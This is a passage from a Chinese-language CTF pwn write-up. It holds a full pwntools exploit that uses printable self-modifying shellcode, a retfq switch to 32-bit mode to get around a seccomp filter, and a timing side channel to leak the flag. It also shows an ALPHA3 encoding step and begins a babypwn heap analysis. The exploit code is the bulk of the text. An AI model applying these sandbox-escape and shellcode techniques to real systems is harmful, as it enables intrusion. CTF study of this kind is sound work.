class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">code_append = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   push rcx</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_append_x86 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   push ebx</span></span><br><span class="line"><span class="string">   pop ebx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_mmap = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /*mov rdi, 0x40404040*/</span></span><br><span class="line"><span class="string">   push 0x40404040</span></span><br><span class="line"><span class="string">   pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rsi, 0x7e*/</span></span><br><span class="line"><span class="string">   push 0x7e</span></span><br><span class="line"><span class="string">   pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rdx, 0x7*/</span></span><br><span class="line"><span class="string">   push 0x37</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov r8, 0*/</span></span><br><span class="line"><span class="string">   push 0x30</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov r9, 0*/</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*syscall*/</span></span><br><span class="line"><span class="string">   push 0x5e</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x2c], cl</span></span><br><span class="line"><span class="string">   push 0x5c</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x2d], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rax, 0x9*/</span></span><br><span class="line"><span class="string">   push 0x39</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_read = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /*mov rsi, 0x40404040*/</span></span><br><span class="line"><span class="string">   push 0x40404040</span></span><br><span class="line"><span class="string">   pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rdi, 0*/</span></span><br><span class="line"><span class="string">   push 0x30</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rdx, 0x7e*/</span></span><br><span class="line"><span class="string">   push 0x7e</span></span><br><span class="line"><span class="string">   pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rax, 0*/</span></span><br><span class="line"><span class="string">   push 0x30</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*syscall*/</span></span><br><span class="line"><span class="string">   push 0x5e</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x4f], cl</span></span><br><span class="line"><span class="string">   push 0x5c</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x50], cl</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* 算出0x48 */</span></span><br><span class="line"><span class="string">   push 0x39</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx + 0x71], cl</span></span><br><span class="line"><span class="string">   push 0x20</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx + 0x71], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /* 利用无借位减法算出0xcb */</span></span><br><span class="line"><span class="string">   push 0x47</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   sub byte ptr [rbx + 0x72], cl</span></span><br><span class="line"><span class="string">   sub byte ptr [rbx + 0x72], cl</span></span><br><span class="line"><span class="string">   push rdi</span></span><br><span class="line"><span class="string">   push rdi</span></span><br><span class="line"><span class="string">   push 0x23</span></span><br><span class="line"><span class="string">   push 0x40404040</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_open = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* open函数 */</span></span><br><span class="line"><span class="string">   mov esp, 0x40404550</span></span><br><span class="line"><span class="string">   push 0x67616c66/* flag */</span></span><br><span class="line"><span class="string">   mov ebx, esp</span></span><br><span class="line"><span class="string">   xor ecx, ecx</span></span><br><span class="line"><span class="string">   xor edx, edx</span></span><br><span class="line"><span class="string">   mov eax, 0x5</span></span><br><span class="line"><span class="string">   int 0x80</span></span><br><span class="line"><span class="string">   mov ecx, eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq_back = asm(<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">   /* retfq */</span></span><br><span class="line"><span class="string">   push 0x33</span></span><br><span class="line"><span class="string">   push 0x40404064 /* 具体数字有待修改 */</span></span><br><span class="line"><span class="string">   retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_read_flag = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">   mov rdi,rcx</span></span><br><span class="line"><span class="string">   mov rsi,rsp</span></span><br><span class="line"><span class="string">   mov rdx,0x70</span></span><br><span class="line"><span class="string">   xor rax,rax</span></span><br><span class="line"><span class="string">   syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">sh, index, ch</span>):</span></span><br><span class="line">   shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   shellcode += code_mmap</span><br><span class="line">   shellcode += code_append</span><br><span class="line">   shellcode += code_read</span><br><span class="line">   shellcode += code_append</span><br><span class="line">   shellcode += code_retfq</span><br><span class="line">   shellcode += code_append</span><br><span class="line">   sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">   shellcode2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   shellcode2 += code_open</span><br><span class="line">   shellcode2 += code_append</span><br><span class="line">   shellcode2 += code_retfq_back</span><br><span class="line">   shellcode2 += shellcode_read_flag</span><br><span class="line">   <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">      shellcode2 += asm(<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="built_in">format</span>(index, ch), arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      shellcode2 += asm(<span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(index, ch), arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">   sh.sendline(shellcode2)</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="comment"># sh = remote(&#x27;39.105.137.118&#x27;, 50050)</span></span><br><span class="line">        sh = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">        pwn(sh, index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">1.5</span>:</span><br><span class="line">            t.append(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> t]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> t]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> t]))</span><br></pre></td></tr></table></figure><ul><li>这道题我后来想再切到32位进行<code>write</code>调用，后来发现是我看错了=-=。这里当调用号为4的时候，返回的是kill，所以我怎么样都没有办法获得输出：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007</span><br></pre></td></tr></table></figure><ul><li><p>不过呢，经过调试也是有一定的收获的：</p><ul><li>遇到不能执行的系统调用，gdb会返回：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Program terminated with signal SIGSYS, Bad system call.</span><br><span class="line">The program no longer exists.</span><br></pre></td></tr></table></figure><ul><li>在调试的过程中，切到32位但是gdb并不会显示正确，如下所示32位架构下，eax为4，系统调用应该为<code>SYS_write</code>，但是gdb还是显示的是<code>SYS_stat</code>，可能这和gdb的版本有关系吧。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x4040407f    mov    ebx, 1</span><br><span class="line">0x40404084    mov    ecx, 0x4040454c</span><br><span class="line">0x40404089    mov    edx, 0x20</span><br><span class="line">0x4040408e    mov    eax, 4</span><br><span class="line">0x40404093    int    0x80 &lt;SYS_stat&gt;</span><br><span class="line">     file: 0x3</span><br><span class="line">     buf: 0x4040454c ◂— insb   byte ptr [rdi], dx /* 0x3332317b67616c66; &#x27;flag&#123;123456&#125;\n&#x27; */</span><br></pre></td></tr></table></figure><ul><li>补充<code>retfq</code>切换到32位和<code>write</code>调用的shellcode：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">code_retfq2 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* retfq */</span></span><br><span class="line"><span class="string">   push 0x23</span></span><br><span class="line"><span class="string">   push 0x4040407f</span></span><br><span class="line"><span class="string">   retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(code_retfq2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># code_write = asm(shellcraft.write(1, 0x4040454c, 100), arch = &#x27;i386&#x27;)</span></span><br><span class="line"></span><br><span class="line">code_write = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* write */</span></span><br><span class="line"><span class="string">   mov ebx, 1 /* 文件描述符 */</span></span><br><span class="line"><span class="string">   mov ecx, 0x4040454c /* flag地址 */</span></span><br><span class="line"><span class="string">   mov edx, 0x20 /* 打印的数据长度 */</span></span><br><span class="line"><span class="string">   mov eax, 0x4 /* 系统调用号 */</span></span><br><span class="line"><span class="string">   int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h4 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h4><ul><li>我们也可以用alpha3项目来完成第一步：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure><ul><li>首先生成shellcode：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">sc</span>):</span></span><br><span class="line"><span class="keyword">return</span> asm(sc, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_read = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, 0x40404040;</span></span><br><span class="line"><span class="string">pushw 0x1010;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">xor rdi, rdi;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9</span></span><br><span class="line">code_mmap = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, 0x40404040;</span></span><br><span class="line"><span class="string">push 0x7f;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">push 7;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">push 34;</span></span><br><span class="line"><span class="string">pop rcx;</span></span><br><span class="line"><span class="string">xor r8, r8;</span></span><br><span class="line"><span class="string">xor r9, r9;</span></span><br><span class="line"><span class="string">push 9;</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_rsp = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsp, 0x40404f40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq = f(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x23;</span></span><br><span class="line"><span class="string">push 0x40404040;</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = code_mmap + code_read + code_rsp + code_retfq</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(shellcode)</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure><ul><li>然后使用alpha3生成可见字符（为什么是rbx呢，因为shellcode调用指令是<code>call rbx</code>）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ALPHA3.py x64 ascii mixedcase rbx --input=&#x27;/home/secc/Desktop/sc&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00</span><br></pre></td></tr></table></figure><ul><li>这样我们第一次发送的payload就可以替换成以上字符串了。</li></ul><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><ul><li>查看沙盒：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ seccomp-tools dump ./babypwn </span><br><span class="line">1.add</span><br><span class="line">2.delete</span><br><span class="line">3.edit</span><br><span class="line">4.show</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>打开IDA反编译程序：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_C54(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">      v3 = sub_BEF();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_DD9();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_EE3();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_103A();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_CDB();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>add函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">16</span> &amp;&amp; (*((_QWORD *)&amp;unk_202060 + <span class="number">2</span> * i) || qword_202068[<span class="number">2</span> * i]); ++i )<span class="comment">// 限制只能同时申请16个堆</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">  size = (<span class="keyword">int</span>)sub_BEF();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  